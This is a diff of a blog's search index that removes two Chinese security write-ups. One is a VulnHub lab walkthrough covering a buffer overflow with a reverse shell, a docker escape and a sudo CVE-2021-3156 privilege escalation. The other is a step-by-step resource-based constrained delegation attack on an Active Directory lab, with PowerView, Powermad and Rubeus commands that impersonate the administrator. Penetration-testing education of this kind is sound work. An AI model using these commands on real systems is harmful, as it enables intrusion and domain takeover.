@@ -1,492 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>vulnhub之缓冲区溢出</title>
-    <url>/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/</url>
-    <content><![CDATA[<h1 id="初步的信息收集"><a href="#初步的信息收集" class="headerlink" title="初步的信息收集"></a>初步的信息收集</h1><p>对靶机进行端口扫描，看到开放了21端口留意可能有匿名登陆</p>
-<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304203927341.png" class title="image-20220304203927341">
-
-
-
-<p>扫描一下端口开放的详细服务信息</p>
-<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304204123320.png" class title="image-20220304204123320">
-
-<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304204147762.png" class title="image-20220304204147762">
-
-
-
-<p>这种有ctf风格的靶场肯定不会开一个没有意义的端口的。。登陆ftp服务，顺便搜一波现成的漏洞。搜出来是ddos，打扰了。</p>
-<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304204345188.png" class title="image-20220304204345188">
-
-<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304204404524.png" class title="image-20220304204404524">
-
-
-
-<p>ftp中可能有好东西，看见的东西都下载到本机</p>
-<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304204505067.png" class title="image-20220304204505067">
-
-
-
-<p>查看下载的文件，运行下发现居然没东西</p>
-<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304204646309.png" class title="image-20220304204646309">
-
-
-
-<p>看到这里感觉不对劲，这是个可执行程序，执行了肯定有进程产生的，看一看进程吧</p>
-<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304204847774.png" class title="image-20220304204847774">
-
-
-
-<p>再联想到目标靶机开启了9898端口，八九不离十了这就是突破点，但还是看一看web服务吧</p>
-<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304205134019.png" class title="image-20220304205134019">
-
-
-
-<p>对web进行信息搜集一波，看看源代码，爆破一下目录</p>
-<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304205236054.png" class title="image-20220304205236054">
-
-
-
-<p>更确定了这极有可能是应用程序的漏洞，监听本地9898端口</p>
-<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304205522149.png" class title="image-20220304205522149">
-
-<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304205537331.png" class title="image-20220304205537331">
-
-<p>看到这里已经懂得都懂了，直接进入正题了</p>
-<h1 id="edb调试"><a href="#edb调试" class="headerlink" title="edb调试"></a>edb调试</h1><p>如果kali没有安装edb-debugger，可以先安装一个</p>
-<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304205836105.png" class title="image-20220304205836105">
-
-
-
-<p>开启本地监听打开edb进行调试，这个地方一定要以root权限打开edb不然会有各种问题</p>
-<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304223641368.png" class title="image-20220304223641368">
-
-<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304223654911.png" class title="image-20220304223654911">
-
-
-
-<p>python生成500个A注入到程序中，观察edb发生的变化</p>
-<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304223811343.png" class title="image-20220304223811343">
-
-<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304223827023.png" class title="image-20220304223827023">
-
-<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304223855172.png" class title="image-20220304223855172">
-
-<p>（报错了，一切都在设想当中）</p>
-<p>EIP寄存器全被被A占满，说明一定在这个参数输入的地方存在缓冲区溢出</p>
-<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304223926084.png" class title="image-20220304223926084">
-
-
-
-<p>理清思路接下来要干嘛</p>
-<p>EIP寄存器存储接下来要执行指令的代码所在的内存地址，ESP是寄存具体的代码的。这两个寄存器的内容都可以进行覆盖，如果能找到一个jump to esp，跳转到esp这样的指令他所在内存空间的地址的话，就可以将这条指令的内存地址，写入到eip寄存器，从而利用jump esp指令强制cpu去执行esp中寄存的程序的代码，因此我们可以提交payload内容替换esp中的内容，可以在其中提交反弹shell的程序代码。因此可以修改eip当中的内容，从而将指令跳转到esp寄存器，esp中存储着我们的恶意代码，一旦这些代码被执行，就会反弹一个shell到kali。</p>
-<p>理清思路后再想想第一步要干嘛，就是在eip寄存器当中写入jump esp这条指令的地址，那么首先就要在这500个A当中确定是从哪一个A开始覆盖了eip寄存器，kali当中msf-pattern_create可以生成随机的字符串</p>
-<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304224821183.png" class title="image-20220304224821183">
-
-<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304224830607.png" class title="image-20220304224830607">
-
-
-
-<p>注入随机字符串后，edb直接报错（每一次调试都要重新启动应用服务和edb）</p>
-<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304224959040.png" class title="image-20220304224959040">
-
-<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304225012042.png" class title="image-20220304225012042">
-
-
-
-<p>现在eip中就是随机字符串当中四个字符的ASCII码，再查一下这四个字符再随机字符串的位置</p>
-<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304225131530.png" class title="image-20220304225131530">
-
-<p>这里也就是说，从112位置开始，eip寄存器被覆盖了四个字符</p>
-<h1 id="脚本验证，EXP编写"><a href="#脚本验证，EXP编写" class="headerlink" title="脚本验证，EXP编写"></a>脚本验证，EXP编写</h1><p>写个脚本验证，果然eip被四个B占满</p>
-<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304225300919.png" class title="image-20220304225300919">
-
-<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304225319309.png" class title="image-20220304225319309">
-
-<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304225341987.png" class title="image-20220304225341987">
-
-<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304225443972.png" class title="image-20220304225443972">
-
-<p>（这里一定要以python2来执行验证脚本）</p>
-<p>现在就要在edb中查找jump esp的指令地址，一定是有x执行权限的服务</p>
-<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304225558528.png" class title="image-20220304225558528">
-
-<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304225620876.png" class title="image-20220304225620876">
-
-
-
-<p>将结果插入到程序代码（B的位置），因为大头小头字节序，地址从低位到高位读取。’\x55\x9d\x04\x08’</p>
-<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304225751989.png" class title="image-20220304225751989">
-
-<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304225803607.png" class title="image-20220304225803607">
-
-
-
-<p>使用msf生成反弹shell的代码，要过滤坏字符，防止程序遇到\x00终止运行</p>
-<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304225903497.png" class title="image-20220304225903497">
-
-<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304225915589.png" class title="image-20220304225915589">
-
-<p>（空字符是保证程序不出错）</p>
-<p>重启服务端程序设置nc监听</p>
-<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304225952851.png" class title="image-20220304225952851">
-
-<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304230010631.png" class title="image-20220304230010631">
-
-<p>（这是在本机做的实验）</p>
-<p>将IP端口改为目标机器重新设置监听</p>
-<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304230210120.png" class title="image-20220304230210120">
-
-<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304230219455.png" class title="image-20220304230219455">
-
-<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304230229256.png" class title="image-20220304230229256">
-
-
-
-<h1 id="反弹shell后docker逃逸"><a href="#反弹shell后docker逃逸" class="headerlink" title="反弹shell后docker逃逸"></a>反弹shell后docker逃逸</h1><p>获得了一个普通权限shell，进行信息收集</p>
-<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304230349765.png" class title="image-20220304230349765">
-
-<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304230359143.png" class title="image-20220304230359143">
-
-
-
-<p>ssh连接22端口不行，那么就连接之前探测到的2222端口</p>
-<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304230442016.png" class title="image-20220304230442016">
-
-
-
-<p>好家伙，发现还是个docker容器，那就docker逃逸吧</p>
-<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304230618570.png" class title="image-20220304230618570">
-
-<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304230628961.png" class title="image-20220304230628961">
-
-
-
-<p>权限配置不当，容器有sudo权限，那就切换成容器的root，查看root文件</p>
-<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304230721118.png" class title="image-20220304230721118">
-
-<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304230733436.png" class title="image-20220304230733436">
-
-
-
-<p>查看两个文本文件得知，提示登陆ftp出错，要访问流量（ftp是基于明文的协议类型）</p>
-<p>进行流量分析，只有命令行不能使用wireshark，使用tcpdump</p>
-<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304230851167.png" class title="image-20220304230851167">
-
-<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304230859891.png" class title="image-20220304230859891">
-
-<p>（接收到用户名密码）</p>
-<p>使用账号密码登陆22端口的ssh服务，发现是宿主机</p>
-<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304230952447.png" class title="image-20220304230952447">
-
-<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304231001814.png" class title="image-20220304231001814">
-
-
-
-<h1 id="进一步信息收集，利用堆溢出漏洞提权"><a href="#进一步信息收集，利用堆溢出漏洞提权" class="headerlink" title="进一步信息收集，利用堆溢出漏洞提权"></a>进一步信息收集，利用堆溢出漏洞提权</h1><p>没有执行sudo的权限</p>
-<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304231226255.png" class title="image-20220304231226255">
-
-
-
-<p>检查内核没戏</p>
-<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304231252289.png" class title="image-20220304231252289">
-
-
-
-<p>抱着永不放弃的精神检查一下还有什么可利用的</p>
-<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304231431058.png" class title="image-20220304231431058">
-
-<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304231440102.png" class title="image-20220304231440102">
-
-
-
-<p>sudo版本低，还是Debian10，直接上谷歌</p>
-<p><a href="https://blog.qualys.com/vulnerabilities-threat-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit">https://blog.qualys.com/vulnerabilities-threat-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit</a></p>
-<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304231534664.png" class title="image-20220304231534664">
-
-<p>果然，这个版本的sudo有堆溢出</p>
-<p>poc验证sudoedit -s ‘&#39; <code>perl -e &#39;print &quot;A&quot; x 65536&#39;</code></p>
-<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304231633754.png" class title="image-20220304231633754">
-
-<p>（因输入的大小原因程序发生了错误）</p>
-<p>msf当中有利用代码，show options缺啥补啥吧</p>
-<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304231712112.png" class title="image-20220304231712112">
-
-<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304231738788.png" class title="image-20220304231738788">
-
-
-
-<p>尝试多次后始终不行，怀疑这里有大坑</p>
-<p>查找手动利用代码，<a href="https://github.com/worawit/CVE-2021-3156%EF%BC%8C%E4%BF%AE%E6%94%B9%E4%B8%80%E7%82%B9%E4%BB%A3%E7%A0%81">https://github.com/worawit/CVE-2021-3156，修改一点代码</a></p>
-<p>一番搜寻过后原来这台机器的sudo路径与众不同。。信息收集的重要性体现出来了</p>
-<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304231935353.png" class title="image-20220304231935353">
-
-
-
-<p>打exp，nc来传输</p>
-<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304231958668.png" class title="image-20220304231958668">
-
-<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304232010595.png" class title="image-20220304232010595">
-
-
-
-<p>执行exp过后终于打点成功</p>
-<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304232045850.png" class title="image-20220304232045850">
-
-
-
-<p>总结：总的来说这台靶机挺有意思的，是很基础的溢出漏洞，但作为一台作者表明高难度的靶机确实有他的难处。缓冲区溢出这里是很原理性的操作，更高难度需要逆向分析的溢出这台还没体现出来，以后会慢慢更新。</p>
-]]></content>
-      <categories>
-        <category>有难度的靶场</category>
-      </categories>
-      <tags>
-        <tag>缓冲区溢出</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>基于资源的约束委派</title>
-    <url>/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>基于资源的约束委派（RBCD）是在windows server 2012中加入的新功能，与普通的约束委派不同，它不需要域管理员去设置相关属性。但是请求ST的过程和约束委派过程大同小异，RBCD把设置委派的权限赋给了机器本身，机器可以决定谁可以被委派来控制自身。更理论一点就是传统的约束委派S4U2Self返回的票据（ST1）一定是可转发的，如果不可转发那么S4U2Proxy将失败；但是基于资源的约束委派不同，就算S4U2Self返回的票据不可转发（可不可以转发由TrustedToAuthenticationForDelegation决定），S4U2Proxy也是可以成功，并且S4U2Proxy返回的票据（ST2）总是可转发。</p>
-<p>这里引用Elad的思维导图（<a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html%EF%BC%89">https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html）</a></p>
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318090529465.png" class title="image-20220318090529465">
-
-<p>从图中可以看出，基于资源的约束委派与传统的约束委派非常相似，但工作方向相反。从帐户 A （例如上一篇文章的DC）到帐户 B 的传统约束委派在帐户 A 的 msDS-AllowedToDelegateTo 属性中配置，并定义从 A 到 B 的“传出”信任，而基于资源的约束委派在帐户 B 的 msDS-AllowedToActOnBehalfOfOtherIdentity 属性中配置，并定义了从 A 到 B 的“传入”信任。 </p>
-<h1 id="基于资源的约束委派利用"><a href="#基于资源的约束委派利用" class="headerlink" title="基于资源的约束委派利用"></a>基于资源的约束委派利用</h1><h2 id="部署环境"><a href="#部署环境" class="headerlink" title="部署环境"></a>部署环境</h2><ul>
-<li>域：whoamianony.org</li>
-<li>域控： 192.168.93.30，主机名DC，Windows Server 2012R2</li>
-<li>域成员： 192.168.93.40，主机名PC2，Windows 7 专业版</li>
-<li>用户bunny对PC2有写权限</li>
-</ul>
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318145144632.png" class title="image-20220318145144632">
-
-<h2 id="修改配置"><a href="#修改配置" class="headerlink" title="修改配置"></a>修改配置</h2><p>验证bunny这个用户是否对PC2有写权限，用pwerview枚举，PC2.whoamianony.org中的特定ACE（<strong>运行脚本一直有报错，但是不影响结果</strong>）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Import-Module .\powerview.ps1</span><br><span class="line">Get-DomainUser -Identity bunny -Properties objectsid</span><br><span class="line">Get-DomainObjectAcl -Identity PC2  | ?&#123;$_.SecurityIdentifier -match &quot;S-1-5-21-1315137663-3706837544-1429009142-1112&quot;&#125;</span><br></pre></td></tr></table></figure>
-
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318151625486.png" class title="image-20220318151625486">
-
-<p>bunny对主机PC2有写入权限，其实不一定要GenericWrite，WriteProperty，WriteDacl都可以，当然最好的是GenericAll（完全控制权）</p>
-<p>现在需要一个具有SPN的账号，因为s4uself只适用于具有SPN的账户，我们的目的是在之后通过s4uproxy协议代替用户发起请求，而s4uproxy是根据kerberos发起请求的，SPN是一种服务主体名称，域环境中的每台服务器都需要在Kerberos身份验证服务中注册SPN。恰好域中有一个属性MachineAccountQuota，这个值表示允许用户在域中创建的计算机账户数，默认为10。我们创建的账户默认注册在<code>RestrictedKrbHost/domain</code>和<code>HOST/domain</code>这两个SPN之下。因此我们可以利用。</p>
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318100656209.png" class title="image-20220318100656209">
-
-
-
-<p>使用powermad中的New-MachineAccount注册一个计算机用户win7，密码为win7</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Import-Module .\Powermad.ps1</span><br><span class="line">New-MachineAccount -MachineAccount win7 -Domain whoamianony.org -DomainController DC.whoamianony.org -Verbose</span><br></pre></td></tr></table></figure>
-
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318151835228.png" class title="image-20220318151835228">
-
-
-
-<p>查看是否添加成功</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net group &quot;domain computers&quot; /domain</span><br></pre></td></tr></table></figure>
-
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318151858125.png" class title="image-20220318151858125">
-
-
-
-<p>查看spn票据，能添加成功机器账号肯定是有spn的，但还是可以查看一下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setspn —q */* | findstr &quot;win7&quot;</span><br></pre></td></tr></table></figure>
-
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318151956537.png" class title="image-20220318151956537">
-
-
-
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318131103230.png" class title="image-20220318131103230">
-
-<p>这是新添加的win7的机器用户  </p>
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318131156113.png" class title="image-20220318131156113">
-
-<p>这是要修改的属性，根据微软官方文档的解释，此属性用于访问检查以确定请求者是否有权代表其他身份对以此帐户运行的服务进行操作。<strong>注：这里截图截错了应该是看PC2的msDS-AllowedToActOnBehalfOfOtherIdentity的值为未设置</strong></p>
-<p>修改PC2的msDS-AllowedToActOnBehalfOfOtherIdentity属性的值，有两种方法</p>
-<p><strong>一、powerview脚本</strong></p>
-<p>首先使用pwerview脚本查看机器账户win7的sid</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get-NetComputer -Identity win7</span><br></pre></td></tr></table></figure>
-
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318152113521.png" class title="image-20220318152113521">
-
-
-
-<p>然后配置win7到PC2的基于资源约束的委派（<strong>运行脚本一直有报错，但是不影响结果</strong>）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1315137663-3706837544-1429009142-2103)&quot;</span><br><span class="line">$SDBytes = New-Object byte[] ($SD.BinaryLength)</span><br><span class="line">$SD.GetBinaryForm($SDBytes, 0)</span><br><span class="line">Get-DomainComputer PC2| Set-DomainObject -Set @&#123;&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;=$SDBytes&#125; -Verbose</span><br></pre></td></tr></table></figure>
-
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318152253325.png" class title="image-20220318152253325">
-
-
-
-<p>验证是否成功添加</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get-DomainComputer PC2 -Properties msds-allowedtoactonbehalfofotheridentity</span><br></pre></td></tr></table></figure>
-
-<p>不为空就修改成功</p>
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318152406051.png" class title="image-20220318152406051">
-
-<p>在域控上查看msds-allowedtoactonbehalfofotheridentity的值可以看到是字节数组，所以不能直接用字符串型</p>
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318132830587.png" class title="image-20220318132830587">
-
-
-
-<p>若想清除msds-allowedtoactonbehalfofotheridentity属性的值，可用如下命令：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set-DomainObject PC2 -Clear &#x27;msds-allowedtoactonbehalfofotheridentity&#x27; -Verbose</span><br></pre></td></tr></table></figure>
-
-<p><strong>二、通过ActiveDirectory模块添加</strong></p>
-<p>只有Windows Server 2012以及以上的ActiveDirectory模块才有-PrincipalsAllowedToDelegateToAccount选项，域内普通主机是不存在ActiveDirectory模块的，但是可以将DLL文件复制出来，然后导入即可</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import-module Microsoft.ActiveDirectory.Management.dll</span><br><span class="line">Set-ADComputer PC2 -PrincipalsAllowedToDelegateToAccount win7$</span><br><span class="line">Get-ADComputer PC2 -Properties PrincipalsAllowedToDelegateToAccount</span><br></pre></td></tr></table></figure>
-
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318133951958.png" class title="image-20220318133951958">
-
-<p>这里已经添加过了，就不再演示了</p>
-<h2 id="进行攻击"><a href="#进行攻击" class="headerlink" title="进行攻击"></a>进行攻击</h2><h3 id="典型的基于资源约束委派攻击"><a href="#典型的基于资源约束委派攻击" class="headerlink" title="典型的基于资源约束委派攻击"></a>典型的基于资源约束委派攻击</h3><p>现在没有票据是肯定无法访问PC2的</p>
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318155719648.png" class title="image-20220318155719648">
-
-
-
-<p>rubeus是不支持明文密码的，先将创建的机器用户的密码转换成hash</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe hash /user:win7 /password:win7 /domain:whoamianony.org</span><br></pre></td></tr></table></figure>
-
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318153253944.png" class title="image-20220318153253944">
-
-
-
-<p>然后用win7的rc4  hash值请求一个可转发的票据（相当于白银票据），并且导入到内存中</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe s4u /user:win7$ /rc4:E096DB6B6E179132B8000763599B4C54 /impersonateuser:administrator /msdsspn:cifs/PC2.whoamianony.org /ptt</span><br></pre></td></tr></table></figure>
-
